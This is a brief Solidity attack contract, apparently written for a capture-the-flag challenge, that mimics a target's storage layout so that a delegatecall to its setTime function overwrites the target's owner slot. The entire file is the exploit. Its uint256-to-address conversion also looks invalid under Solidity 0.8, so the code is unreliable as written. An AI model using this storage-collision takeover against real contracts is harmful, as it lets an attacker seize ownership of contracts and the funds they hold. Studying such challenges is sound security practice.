pragma solidity ^0.8.0;
contract MaliciousLibrary2 {
    // Storage layout matches Preservation's: owner at slot 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    function setTime(uint256 _newOwner) public {
        owner = address(_newOwner);
    }
}